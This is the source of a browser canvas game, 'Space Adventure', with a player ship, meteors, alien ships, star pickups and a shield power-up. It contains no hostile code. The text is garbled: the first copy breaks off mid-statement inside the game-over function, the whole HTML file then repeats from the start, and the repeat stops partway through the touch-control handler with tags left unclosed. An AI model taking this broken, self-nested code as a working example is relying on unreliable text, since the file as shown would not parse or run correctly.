<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Space Adventure</title>
    <style>
        body, html { 
            margin: 0; 
            padding: 0; 
            overflow: hidden; 
            background: #000; 
            font-family: 'Arial', sans-serif;
            color: #fff;
        }
        #gameCanvas { 
            display: block; 
            background: url('https://cdnjs.cloudflare.com/ajax/libs/simple-icons/3.0.1/simple-icons.svg') 0 0 / 100px 100px;
        }
        #hud {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            z-index: 10;
        }
        .hudItem {
            background: rgba(0, 0, 0, 0.7);
            padding: 10px 20px;
            border-radius: 10px;
            border: 2px solid #4287f5;
            box-shadow: 0 0 10px #4287f5;
        }
        #lives {
            display: flex;
            align-items: center;
        }
        .heart {
            color: #ff3860;
            font-size: 24px;
            margin-left: 5px;
        }
        #scoreBoard { 
            font-size: 20px;
            color: #4287f5;
        }
        #message {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-size: 32px;
            color: #fff;
            background: rgba(0, 0, 0, 0.8);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid #4287f5;
            box-shadow: 0 0 20px #4287f5;
            display: none;
            z-index: 100;
            width: 80%;
            max-width: 500px;
        }
        #playBtn {
            margin-top: 20px;
            padding: 15px 30px;
            font-size: 20px;
            background: linear-gradient(135deg, #4287f5, #3a4db3);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        #playBtn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(66, 135, 245, 0.8);
        }
        #levelIndicator {
            position: absolute;
            top: 70px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.7);
            padding: 5px 15px;
            border-radius: 15px;
            font-size: 16px;
            color: #4287f5;
            border: 1px solid #4287f5;
        }
        #powerupIndicator {
            position: absolute;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.7);
            padding: 10px;
            border-radius: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <canvas id="gameCanvas"></canvas>
    <div id="hud">
        <div id="lives" class="hudItem">Lives: <span id="lifeContainer"></span></div>
        <div id="scoreBoard" class="hudItem">Score: <span id="score">0</span></div>
    </div>
    <div id="levelIndicator">Level: <span id="level">1</span></div>
    <div id="powerupIndicator">Shield Active: <span id="powerupTime">5</span>s</div>
    <div id="message">
        <h2>Game Over!</h2>
        <p id="finalScore">Your score: 0</p>
        <p id="highScore">High score: 0</p>
        <button id="playBtn">Play Again</button>
    </div>

    <script>
        // Canvas setup
        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');
        let width = canvas.width = window.innerWidth;
        let height = canvas.height = window.innerHeight;
        
        window.addEventListener('resize', () => {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
            if (player) {
                player.x = Math.min(Math.max(player.x, player.size), width - player.size);
                player.y = Math.min(Math.max(player.y, player.size), height - player.size);
            }
        });

        // Game variables
        let score = 0;
        let highScore = localStorage.getItem('spaceAdventureHighScore') || 0;
        let level = 1;
        let lives = 3;
        let gameOver = false;
        let gameObjects = [];
        let player = null;
        let powerupActive = false;
        let powerupTimeLeft = 0;
        let particles = [];
        let stars = [];
        
        // Create star background
        function createStars() {
            stars = [];
            const starCount = Math.floor(width * height / 5000);
            for (let i = 0; i < starCount; i++) {
                stars.push({
                    x: Math.random() * width,
                    y: Math.random() * height,
                    size: Math.random() * 2 + 0.5,
                    speed: Math.random() * 0.3 + 0.1
                });
            }
        }
        
        function updateStars() {
            stars.forEach(star => {
                star.y += star.speed;
                if (star.y > height) {
                    star.y = 0;
                    star.x = Math.random() * width;
                }
            });
        }
        
        function drawStars() {
            stars.forEach(star => {
                ctx.fillStyle = `rgba(255, 255, 255, ${Math.random() * 0.3 + 0.7})`;
                ctx.beginPath();
                ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
                ctx.fill();
            });
        }

        // Player object
        function Player() {
            this.size = 30;
            this.x = width / 2;
            this.y = height - this.size * 2;
            this.speed = 8;
            this.dx = 0;
            this.dy = 0;
            
            this.draw = function() {
                ctx.save();
                ctx.translate(this.x, this.y);
                
                // Draw ship body
                ctx.fillStyle = '#4287f5';
                ctx.beginPath();
                ctx.moveTo(0, -this.size);
                ctx.lineTo(this.size, this.size);
                ctx.lineTo(0, this.size / 2);
                ctx.lineTo(-this.size, this.size);
                ctx.closePath();
                ctx.fill();
                
                // Draw engine glow
                ctx.fillStyle = '#ff7700';
                ctx.beginPath();
                ctx.moveTo(-this.size/2, this.size);
                ctx.lineTo(0, this.size/2);
                ctx.lineTo(this.size/2, this.size);
                ctx.lineTo(0, this.size + Math.random() * 10);
                ctx.closePath();
                ctx.fill();
                
                // Draw shield if powerup is active
                if (powerupActive) {
                    ctx.strokeStyle = `rgba(64, 224, 208, ${0.5 + Math.sin(Date.now() / 200) * 0.5})`;
                    ctx.lineWidth = 3;
                    ctx.beginPath();
                    ctx.arc(0, 0, this.size + 10, 0, Math.PI * 2);
                    ctx.stroke();
                }
                
                ctx.restore();
            };
            
            this.update = function() {
                this.x += this.dx;
                this.y += this.dy;
                
                // Boundary checks
                this.x = Math.min(Math.max(this.x, this.size), width - this.size);
                this.y = Math.min(Math.max(this.y, this.size), height - this.size);
                
                // Add friction
                this.dx *= 0.95;
                this.dy *= 0.95;
                
                // Stop if very slow
                if (Math.abs(this.dx) < 0.1) this.dx = 0;
                if (Math.abs(this.dy) < 0.1) this.dy = 0;
            };
        }

        // Enemy objects
        function Enemy() {
            this.type = Math.random() < 0.8 ? 'meteor' : 'alien';
            this.size = this.type === 'meteor' ? 20 + Math.random() * 30 : 25;
            this.x = Math.random() * (width - this.size * 2) + this.size;
            this.y = -this.size;
            this.speed = 2 + Math.random() * 3 * (level * 0.2);
            this.rotation = 0;
            this.rotationSpeed = (Math.random() - 0.5) * 0.1;
            this.color = this.type === 'meteor' ? '#a89f82' : '#5cdb5c';
            
            this.draw = function() {
                ctx.save();
                ctx.translate(this.x, this.y);
                ctx.rotate(this.rotation);
                
                if (this.type === 'meteor') {
                    // Draw meteor
                    ctx.fillStyle = this.color;
                    ctx.beginPath();
                    
                    // Create irregular shape for meteor
                    const segments = 10;
                    for (let i = 0; i < segments; i++) {
                        const angle = (i / segments) * Math.PI * 2;
                        const rad = this.size * (0.8 + Math.random() * 0.4);
                        const x = Math.cos(angle) * rad;
                        const y = Math.sin(angle) * rad;
                        
                        if (i === 0) ctx.moveTo(x, y);
                        else ctx.lineTo(x, y);
                    }
                    
                    ctx.closePath();
                    ctx.fill();
                    
                    // Add crater details
                    ctx.fillStyle = '#7a7168';
                    for (let i = 0; i < 3; i++) {
                        const craterSize = this.size * (0.1 + Math.random() * 0.2);
                        const craterX = (Math.random() - 0.5) * this.size;
                        const craterY = (Math.random() - 0.5) * this.size;
                        
                        ctx.beginPath();
                        ctx.arc(craterX, craterY, craterSize, 0, Math.PI * 2);
                        ctx.fill();
                    }
                } else {
                    // Draw alien ship
                    ctx.fillStyle = this.color;
                    
                    // Ship body
                    ctx.beginPath();
                    ctx.ellipse(0, 0, this.size, this.size * 0.4, 0, 0, Math.PI * 2);
                    ctx.fill();
                    
                    // Top dome
                    ctx.fillStyle = '#88ff88';
                    ctx.beginPath();
                    ctx.ellipse(0, 0, this.size * 0.6, this.size * 0.3, 0, 0, Math.PI * 2);
                    ctx.fill();
                    
                    // Lights
                    const lightColors = ['#ff0', '#f0f', '#0ff'];
                    for (let i = 0; i < 3; i++) {
                        const angle = (i / 3) * Math.PI * 2;
                        const lightX = Math.cos(angle) * this.size * 0.7;
                        const lightY = Math.sin(angle) * this.size * 0.3;
                        
                        ctx.fillStyle = lightColors[i];
                        ctx.beginPath();
                        ctx.arc(lightX, lightY, this.size * 0.1, 0, Math.PI * 2);
                        ctx.fill();
                    }
                }
                
                ctx.restore();
            };
            
            this.update = function() {
                this.y += this.speed;
                this.rotation += this.rotationSpeed;
                
                if (this.type === 'alien') {
                    // Make aliens move in a sine wave pattern
                    this.x += Math.sin(this.y / 50) * 2;
                }
                
                return this.y - this.size > height;
            };
        }

        // Collectible objects
        function Collectible() {
            this.type = Math.random() < 0.7 ? 'star' : 'powerup';
            this.size = this.type === 'star' ? 15 : 20;
            this.x = Math.random() * (width - this.size * 2) + this.size;
            this.y = -this.size;
            this.speed = 3 + Math.random() * 2;
            this.rotation = 0;
            this.rotationSpeed = 0.05;
            
            this.draw = function() {
                ctx.save();
                ctx.translate(this.x, this.y);
                ctx.rotate(this.rotation);
                
                if (this.type === 'star') {
                    // Draw star
                    ctx.fillStyle = '#ffd700';
                    ctx.beginPath();
                    
                    const spikes = 5;
                    const outerRadius = this.size;
                    const innerRadius = this.size / 2.5;
                    
                    for (let i = 0; i < spikes * 2; i++) {
                        const radius = i % 2 === 0 ? outerRadius : innerRadius;
                        const angle = (i / (spikes * 2)) * Math.PI * 2;
                        const x = Math.cos(angle) * radius;
                        const y = Math.sin(angle) * radius;
                        
                        if (i === 0) ctx.moveTo(x, y);
                        else ctx.lineTo(x, y);
                    }
                    
                    ctx.closePath();
                    ctx.fill();
                    
                    // Add glow effect
                    ctx.shadowBlur = 10;
                    ctx.shadowColor = '#ffd700';
                } else {
                    // Draw powerup (shield)
                    ctx.fillStyle = '#40e0d0';
                    ctx.beginPath();
                    ctx.arc(0, 0, this.size, 0, Math.PI * 2);
                    ctx.fill();
                    
                    // Shield icon
                    ctx.fillStyle = '#fff';
                    ctx.beginPath();
                    ctx.moveTo(0, -this.size/2);
                    ctx.lineTo(this.size/2, 0);
                    ctx.lineTo(0, this.size/2);
                    ctx.lineTo(-this.size/2, 0);
                    ctx.closePath();
                    ctx.fill();
                    
                    // Add glow effect
                    ctx.shadowBlur = 15;
                    ctx.shadowColor = '#40e0d0';
                }
                
                ctx.restore();
            };
            
            this.update = function() {
                this.y += this.speed;
                this.rotation += this.rotationSpeed;
                
                // Add slight horizontal movement to stars
                if (this.type === 'star') {
                    this.x += Math.sin(this.y / 30) * 0.5;
                }
                
                return this.y - this.size > height;
            };
        }

        // Explosion particle effect
        function createExplosion(x, y, color, count = 20) {
            for (let i = 0; i < count; i++) {
                particles.push({
                    x,
                    y,
                    size: Math.random() * 3 + 2,
                    color: color || '#ff5e00',
                    speedX: (Math.random() - 0.5) * 8,
                    speedY: (Math.random() - 0.5) * 8,
                    life: Math.random() * 30 + 20
                });
            }
        }
        
        function updateParticles() {
            particles = particles.filter(p => {
                p.x += p.speedX;
                p.y += p.speedY;
                p.life--;
                p.speedX *= 0.98;
                p.speedY *= 0.98;
                p.size *= 0.96;
                return p.life > 0;
            });
        }
        
        function drawParticles() {
            particles.forEach(p => {
                ctx.fillStyle = p.color;
                ctx.globalAlpha = p.life / 50;
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fill();
            });
            ctx.globalAlpha = 1;
        }

        // Collision detection
        function checkCollisions() {
            gameObjects.forEach((obj, index) => {
                if (obj instanceof Enemy) {
                    const dx = obj.x - player.x;
                    const dy = obj.y - player.y;
                    const distance = Math.sqrt(dx * dx + dy * dy);
                    
                    if (distance < player.size + obj.size * 0.7) {
                        // Player hit enemy
                        if (!powerupActive) {
                            lives--;
                            updateLives();
                            createExplosion(obj.x, obj.y, '#ff3333', 40);
                            
                            if (lives <= 0) {
                                endGame();
                            }
                        } else {
                            // Shield deflects enemy
                            createExplosion(obj.x, obj.y, '#40e0d0', 30);
                            score += 5;
                        }
                        
                        gameObjects.splice(index, 1);
                        updateScore();
                    }
                } else if (obj instanceof Collectible) {
                    const dx = obj.x - player.x;
                    const dy = obj.y - player.y;
                    const distance = Math.sqrt(dx * dx + dy * dy);
                    
                    if (distance < player.size + obj.size) {
                        // Player collected item
                        if (obj.type === 'star') {
                            score += 10;
                            createExplosion(obj.x, obj.y, '#ffd700', 15);
                        } else {
                            // Activate shield powerup
                            powerupActive = true;
                            powerupTimeLeft = 5;
                            document.getElementById('powerupIndicator').style.display = 'block';
                            document.getElementById('powerupTime').textContent = powerupTimeLeft;
                            createExplosion(player.x, player.y, '#40e0d0', 30);
                        }
                        
                        gameObjects.splice(index, 1);
                        updateScore();
                        
                        // Check for level up
                        if (score >= level * 100) {
                            levelUp();
                        }
                    }
                }
            });
        }

        // Game control functions
        function updateScore() {
            document.getElementById('score').textContent = score;
        }
        
        function updateLives() {
            const container = document.getElementById('lifeContainer');
            container.innerHTML = '';
            for (let i = 0; i < lives; i++) {
                container.innerHTML += '<span class="heart">♥</span>';
            }
        }
        
        function levelUp() {
            level++;
            document.getElementById('level').textContent = level;
            
            // Visual effect for level up
            const levelIndicator = document.getElementById('levelIndicator');
            levelIndicator.style.transform = 'translateX(-50%) scale(1.5)';
            levelIndicator.style.color = '#ff7700';
            
            setTimeout(() => {
                levelIndicator.style.transform = 'translateX(-50%) scale(1)';
                levelIndicator.style.color = '#4287f5';
            }, 1000);
        }
        
        function endGame() {
            gameOver = true;
            
            // Update high score
            if (score > highScore) {
                highScore = score;
                localStorage.setItem('spaceAdventureHighScore', highScore);
            }
            
            // Show game over message
            document.getElementById(<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Space Adventure</title>
    <style>
        body, html { 
            margin: 0; 
            padding: 0; 
            overflow: hidden; 
            background: #000; 
            font-family: 'Arial', sans-serif;
            color: #fff;
        }
        #gameCanvas { 
            display: block; 
            background: url('https://cdnjs.cloudflare.com/ajax/libs/simple-icons/3.0.1/simple-icons.svg') 0 0 / 100px 100px;
        }
        #hud {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            z-index: 10;
        }
        .hudItem {
            background: rgba(0, 0, 0, 0.7);
            padding: 10px 20px;
            border-radius: 10px;
            border: 2px solid #4287f5;
            box-shadow: 0 0 10px #4287f5;
        }
        #lives {
            display: flex;
            align-items: center;
        }
        .heart {
            color: #ff3860;
            font-size: 24px;
            margin-left: 5px;
        }
        #scoreBoard { 
            font-size: 20px;
            color: #4287f5;
        }
        #message {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-size: 32px;
            color: #fff;
            background: rgba(0, 0, 0, 0.8);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid #4287f5;
            box-shadow: 0 0 20px #4287f5;
            display: none;
            z-index: 100;
            width: 80%;
            max-width: 500px;
        }
        #playBtn {
            margin-top: 20px;
            padding: 15px 30px;
            font-size: 20px;
            background: linear-gradient(135deg, #4287f5, #3a4db3);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        #playBtn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(66, 135, 245, 0.8);
        }
        #levelIndicator {
            position: absolute;
            top: 70px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.7);
            padding: 5px 15px;
            border-radius: 15px;
            font-size: 16px;
            color: #4287f5;
            border: 1px solid #4287f5;
        }
        #powerupIndicator {
            position: absolute;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.7);
            padding: 10px;
            border-radius: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <canvas id="gameCanvas"></canvas>
    <div id="hud">
        <div id="lives" class="hudItem">Lives: <span id="lifeContainer"></span></div>
        <div id="scoreBoard" class="hudItem">Score: <span id="score">0</span></div>
    </div>
    <div id="levelIndicator">Level: <span id="level">1</span></div>
    <div id="powerupIndicator">Shield Active: <span id="powerupTime">5</span>s</div>
    <div id="message">
        <h2>Game Over!</h2>
        <p id="finalScore">Your score: 0</p>
        <p id="highScore">High score: 0</p>
        <button id="playBtn">Play Again</button>
    </div>

    <script>
        // Canvas setup
        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');
        let width = canvas.width = window.innerWidth;
        let height = canvas.height = window.innerHeight;
        
        window.addEventListener('resize', () => {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
            if (player) {
                player.x = Math.min(Math.max(player.x, player.size), width - player.size);
                player.y = Math.min(Math.max(player.y, player.size), height - player.size);
            }
        });

        // Game variables
        let score = 0;
        let highScore = localStorage.getItem('spaceAdventureHighScore') || 0;
        let level = 1;
        let lives = 3;
        let gameOver = false;
        let gameObjects = [];
        let player = null;
        let powerupActive = false;
        let powerupTimeLeft = 0;
        let particles = [];
        let stars = [];
        
        // Create star background
        function createStars() {
            stars = [];
            const starCount = Math.floor(width * height / 5000);
            for (let i = 0; i < starCount; i++) {
                stars.push({
                    x: Math.random() * width,
                    y: Math.random() * height,
                    size: Math.random() * 2 + 0.5,
                    speed: Math.random() * 0.3 + 0.1
                });
            }
        }
        
        function updateStars() {
            stars.forEach(star => {
                star.y += star.speed;
                if (star.y > height) {
                    star.y = 0;
                    star.x = Math.random() * width;
                }
            });
        }
        
        function drawStars() {
            stars.forEach(star => {
                ctx.fillStyle = `rgba(255, 255, 255, ${Math.random() * 0.3 + 0.7})`;
                ctx.beginPath();
                ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
                ctx.fill();
            });
        }

        // Player object
        function Player() {
            this.size = 30;
            this.x = width / 2;
            this.y = height - this.size * 2;
            this.speed = 8;
            this.dx = 0;
            this.dy = 0;
            
            this.draw = function() {
                ctx.save();
                ctx.translate(this.x, this.y);
                
                // Draw ship body
                ctx.fillStyle = '#4287f5';
                ctx.beginPath();
                ctx.moveTo(0, -this.size);
                ctx.lineTo(this.size, this.size);
                ctx.lineTo(0, this.size / 2);
                ctx.lineTo(-this.size, this.size);
                ctx.closePath();
                ctx.fill();
                
                // Draw engine glow
                ctx.fillStyle = '#ff7700';
                ctx.beginPath();
                ctx.moveTo(-this.size/2, this.size);
                ctx.lineTo(0, this.size/2);
                ctx.lineTo(this.size/2, this.size);
                ctx.lineTo(0, this.size + Math.random() * 10);
                ctx.closePath();
                ctx.fill();
                
                // Draw shield if powerup is active
                if (powerupActive) {
                    ctx.strokeStyle = `rgba(64, 224, 208, ${0.5 + Math.sin(Date.now() / 200) * 0.5})`;
                    ctx.lineWidth = 3;
                    ctx.beginPath();
                    ctx.arc(0, 0, this.size + 10, 0, Math.PI * 2);
                    ctx.stroke();
                }
                
                ctx.restore();
            };
            
            this.update = function() {
                this.x += this.dx;
                this.y += this.dy;
                
                // Boundary checks
                this.x = Math.min(Math.max(this.x, this.size), width - this.size);
                this.y = Math.min(Math.max(this.y, this.size), height - this.size);
                
                // Add friction
                this.dx *= 0.95;
                this.dy *= 0.95;
                
                // Stop if very slow
                if (Math.abs(this.dx) < 0.1) this.dx = 0;
                if (Math.abs(this.dy) < 0.1) this.dy = 0;
            };
        }

        // Enemy objects
        function Enemy() {
            this.type = Math.random() < 0.8 ? 'meteor' : 'alien';
            this.size = this.type === 'meteor' ? 20 + Math.random() * 30 : 25;
            this.x = Math.random() * (width - this.size * 2) + this.size;
            this.y = -this.size;
            this.speed = 2 + Math.random() * 3 * (level * 0.2);
            this.rotation = 0;
            this.rotationSpeed = (Math.random() - 0.5) * 0.1;
            this.color = this.type === 'meteor' ? '#a89f82' : '#5cdb5c';
            
            this.draw = function() {
                ctx.save();
                ctx.translate(this.x, this.y);
                ctx.rotate(this.rotation);
                
                if (this.type === 'meteor') {
                    // Draw meteor
                    ctx.fillStyle = this.color;
                    ctx.beginPath();
                    
                    // Create irregular shape for meteor
                    const segments = 10;
                    for (let i = 0; i < segments; i++) {
                        const angle = (i / segments) * Math.PI * 2;
                        const rad = this.size * (0.8 + Math.random() * 0.4);
                        const x = Math.cos(angle) * rad;
                        const y = Math.sin(angle) * rad;
                        
                        if (i === 0) ctx.moveTo(x, y);
                        else ctx.lineTo(x, y);
                    }
                    
                    ctx.closePath();
                    ctx.fill();
                    
                    // Add crater details
                    ctx.fillStyle = '#7a7168';
                    for (let i = 0; i < 3; i++) {
                        const craterSize = this.size * (0.1 + Math.random() * 0.2);
                        const craterX = (Math.random() - 0.5) * this.size;
                        const craterY = (Math.random() - 0.5) * this.size;
                        
                        ctx.beginPath();
                        ctx.arc(craterX, craterY, craterSize, 0, Math.PI * 2);
                        ctx.fill();
                    }
                } else {
                    // Draw alien ship
                    ctx.fillStyle = this.color;
                    
                    // Ship body
                    ctx.beginPath();
                    ctx.ellipse(0, 0, this.size, this.size * 0.4, 0, 0, Math.PI * 2);
                    ctx.fill();
                    
                    // Top dome
                    ctx.fillStyle = '#88ff88';
                    ctx.beginPath();
                    ctx.ellipse(0, 0, this.size * 0.6, this.size * 0.3, 0, 0, Math.PI * 2);
                    ctx.fill();
                    
                    // Lights
                    const lightColors = ['#ff0', '#f0f', '#0ff'];
                    for (let i = 0; i < 3; i++) {
                        const angle = (i / 3) * Math.PI * 2;
                        const lightX = Math.cos(angle) * this.size * 0.7;
                        const lightY = Math.sin(angle) * this.size * 0.3;
                        
                        ctx.fillStyle = lightColors[i];
                        ctx.beginPath();
                        ctx.arc(lightX, lightY, this.size * 0.1, 0, Math.PI * 2);
                        ctx.fill();
                    }
                }
                
                ctx.restore();
            };
            
            this.update = function() {
                this.y += this.speed;
                this.rotation += this.rotationSpeed;
                
                if (this.type === 'alien') {
                    // Make aliens move in a sine wave pattern
                    this.x += Math.sin(this.y / 50) * 2;
                }
                
                return this.y - this.size > height;
            };
        }

        // Collectible objects
        function Collectible() {
            this.type = Math.random() < 0.7 ? 'star' : 'powerup';
            this.size = this.type === 'star' ? 15 : 20;
            this.x = Math.random() * (width - this.size * 2) + this.size;
            this.y = -this.size;
            this.speed = 3 + Math.random() * 2;
            this.rotation = 0;
            this.rotationSpeed = 0.05;
            
            this.draw = function() {
                ctx.save();
                ctx.translate(this.x, this.y);
                ctx.rotate(this.rotation);
                
                if (this.type === 'star') {
                    // Draw star
                    ctx.fillStyle = '#ffd700';
                    ctx.beginPath();
                    
                    const spikes = 5;
                    const outerRadius = this.size;
                    const innerRadius = this.size / 2.5;
                    
                    for (let i = 0; i < spikes * 2; i++) {
                        const radius = i % 2 === 0 ? outerRadius : innerRadius;
                        const angle = (i / (spikes * 2)) * Math.PI * 2;
                        const x = Math.cos(angle) * radius;
                        const y = Math.sin(angle) * radius;
                        
                        if (i === 0) ctx.moveTo(x, y);
                        else ctx.lineTo(x, y);
                    }
                    
                    ctx.closePath();
                    ctx.fill();
                    
                    // Add glow effect
                    ctx.shadowBlur = 10;
                    ctx.shadowColor = '#ffd700';
                } else {
                    // Draw powerup (shield)
                    ctx.fillStyle = '#40e0d0';
                    ctx.beginPath();
                    ctx.arc(0, 0, this.size, 0, Math.PI * 2);
                    ctx.fill();
                    
                    // Shield icon
                    ctx.fillStyle = '#fff';
                    ctx.beginPath();
                    ctx.moveTo(0, -this.size/2);
                    ctx.lineTo(this.size/2, 0);
                    ctx.lineTo(0, this.size/2);
                    ctx.lineTo(-this.size/2, 0);
                    ctx.closePath();
                    ctx.fill();
                    
                    // Add glow effect
                    ctx.shadowBlur = 15;
                    ctx.shadowColor = '#40e0d0';
                }
                
                ctx.restore();
            };
            
            this.update = function() {
                this.y += this.speed;
                this.rotation += this.rotationSpeed;
                
                // Add slight horizontal movement to stars
                if (this.type === 'star') {
                    this.x += Math.sin(this.y / 30) * 0.5;
                }
                
                return this.y - this.size > height;
            };
        }

        // Explosion particle effect
        function createExplosion(x, y, color, count = 20) {
            for (let i = 0; i < count; i++) {
                particles.push({
                    x,
                    y,
                    size: Math.random() * 3 + 2,
                    color: color || '#ff5e00',
                    speedX: (Math.random() - 0.5) * 8,
                    speedY: (Math.random() - 0.5) * 8,
                    life: Math.random() * 30 + 20
                });
            }
        }
        
        function updateParticles() {
            particles = particles.filter(p => {
                p.x += p.speedX;
                p.y += p.speedY;
                p.life--;
                p.speedX *= 0.98;
                p.speedY *= 0.98;
                p.size *= 0.96;
                return p.life > 0;
            });
        }
        
        function drawParticles() {
            particles.forEach(p => {
                ctx.fillStyle = p.color;
                ctx.globalAlpha = p.life / 50;
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fill();
            });
            ctx.globalAlpha = 1;
        }

        // Collision detection
        function checkCollisions() {
            gameObjects.forEach((obj, index) => {
                if (obj instanceof Enemy) {
                    const dx = obj.x - player.x;
                    const dy = obj.y - player.y;
                    const distance = Math.sqrt(dx * dx + dy * dy);
                    
                    if (distance < player.size + obj.size * 0.7) {
                        // Player hit enemy
                        if (!powerupActive) {
                            lives--;
                            updateLives();
                            createExplosion(obj.x, obj.y, '#ff3333', 40);
                            
                            if (lives <= 0) {
                                endGame();
                            }
                        } else {
                            // Shield deflects enemy
                            createExplosion(obj.x, obj.y, '#40e0d0', 30);
                            score += 5;
                        }
                        
                        gameObjects.splice(index, 1);
                        updateScore();
                    }
                } else if (obj instanceof Collectible) {
                    const dx = obj.x - player.x;
                    const dy = obj.y - player.y;
                    const distance = Math.sqrt(dx * dx + dy * dy);
                    
                    if (distance < player.size + obj.size) {
                        // Player collected item
                        if (obj.type === 'star') {
                            score += 10;
                            createExplosion(obj.x, obj.y, '#ffd700', 15);
                        } else {
                            // Activate shield powerup
                            powerupActive = true;
                            powerupTimeLeft = 5;
                            document.getElementById('powerupIndicator').style.display = 'block';
                            document.getElementById('powerupTime').textContent = powerupTimeLeft;
                            createExplosion(player.x, player.y, '#40e0d0', 30);
                        }
                        
                        gameObjects.splice(index, 1);
                        updateScore();
                        
                        // Check for level up
                        if (score >= level * 100) {
                            levelUp();
                        }
                    }
                }
            });
        }

        // Game control functions
        function updateScore() {
            document.getElementById('score').textContent = score;
        }
        
        function updateLives() {
            const container = document.getElementById('lifeContainer');
            container.innerHTML = '';
            for (let i = 0; i < lives; i++) {
                container.innerHTML += '<span class="heart">♥</span>';
            }
        }
        
        function levelUp() {
            level++;
            document.getElementById('level').textContent = level;
            
            // Visual effect for level up
            const levelIndicator = document.getElementById('levelIndicator');
            levelIndicator.style.transform = 'translateX(-50%) scale(1.5)';
            levelIndicator.style.color = '#ff7700';
            
            setTimeout(() => {
                levelIndicator.style.transform = 'translateX(-50%) scale(1)';
                levelIndicator.style.color = '#4287f5';
            }, 1000);
        }
        
        function endGame() {
            gameOver = true;
            
            // Update high score
            if (score > highScore) {
                highScore = score;
                localStorage.setItem('spaceAdventureHighScore', highScore);
            }
            
            // Show game over message
            document.getElementById('finalScore').textContent = `Your score: ${score}`;
            document.getElementById('highScore').textContent = `High score: ${highScore}`;
            document.getElementById('message').style.display = 'block';
        }
        
        function startGame() {
            gameObjects = [];
            particles = [];
            score = 0;
            level = 1;
            lives = 3;
            gameOver = false;
            powerupActive = false;
            powerupTimeLeft = 0;
            
            player = new Player();
            
            // Reset UI
            updateScore();
            updateLives();
            document.getElementById('level').textContent = level;
            document.getElementById('message').style.display = 'none';
            document.getElementById('powerupIndicator').style.display = 'none';
            
            createStars();
            loop();
        }

        // Main game loop
        let lastTime = 0;
        let spawnTimer = 0;
        let powerupTimer = 0;
        
        function loop(timestamp = 0) {
            const deltaTime = timestamp - lastTime;
            lastTime = timestamp;
            
            // Clear canvas
            ctx.fillStyle = '#000';
            ctx.fillRect(0, 0, width, height);
            
            // Update and draw stars
            updateStars();
            drawStars();
            
            // Spawn new objects
            spawnTimer += deltaTime;
            if (spawnTimer >= 1000) {
                spawnTimer = 0;
                
                // Spawn enemies with increasing frequency based on level
                if (Math.random() < 0.3 + (level * 0.05)) {
                    gameObjects.push(new Enemy());
                }
                
                // Spawn collectibles less frequently
                if (Math.random() < 0.15) {
                    gameObjects.push(new Collectible());
                }
            }
            
            // Update powerup timer
            if (powerupActive) {
                powerupTimer += deltaTime;
                if (powerupTimer >= 1000) {
                    powerupTimer = 0;
                    powerupTimeLeft--;
                    document.getElementById('powerupTime').textContent = powerupTimeLeft;
                    
                    if (powerupTimeLeft <= 0) {
                        powerupActive = false;
                        document.getElementById('powerupIndicator').style.display = 'none';
                    }
                }
            }
            
            // Update and draw player
            player.update();
            player.draw();
            
            // Update and draw game objects
            gameObjects = gameObjects.filter(obj => {
                const offScreen = obj.update();
                obj.draw();
                return !offScreen;
            });
            
            // Update and draw particles
            updateParticles();
            drawParticles();
            
            // Check for collisions
            checkCollisions();
            
            // Continue game loop if not game over
            if (!gameOver) {
                requestAnimationFrame(loop);
            }
        }

        // Event listeners
        document.addEventListener('keydown', e => {
            if (gameOver) return;
            
            const speed = player.speed;
            switch (e.key) {
                case 'ArrowLeft':
                case 'a':
                    player.dx = -speed;
                    break;
                case 'ArrowRight':
                case 'd':
                    player.dx = speed;
                    break;
                case 'ArrowUp':
                case 'w':
                    player.dy = -speed;
                    break;
                case 'ArrowDown':
                case 's':
                    player.dy = speed;
                    break;
            }
        });
        
        document.addEventListener('keyup', e => {
            if (gameOver) return;
            
            switch (e.key) {
                case 'ArrowLeft':
                case 'a':
                case 'ArrowRight':
                case 'd':
                    player.dx = 0;
                    break;
                case 'ArrowUp':
                case 'w':
                case 'ArrowDown':
                case 's':
                    player.dy = 0;
                    break;
            }
        });
        
        // Touch controls for mobile
        let touchStartX = 0;
        let touchStartY = 0;
        
        canvas.addEventListener('touchstart', e => {
            if (gameOver) return;
            
            touchStartX = e.touches[0].clientX;
            touchStartY = e.touches[0].clientY;
            e.preventDefault();
        });
        
        canvas.addEventListener('touchmove', e => {
            if (gameOver) return;
            
            const touchX = e.touches[0].clientX;
            const touchY = e.touches[0].clientY;
            
            player.x += (touchX - touchStartX) * 0.5;
            player.y += (touchY - touchStartY) * 0.5;
            
            touchStartX = touchX;
            touchStartY = touchY;
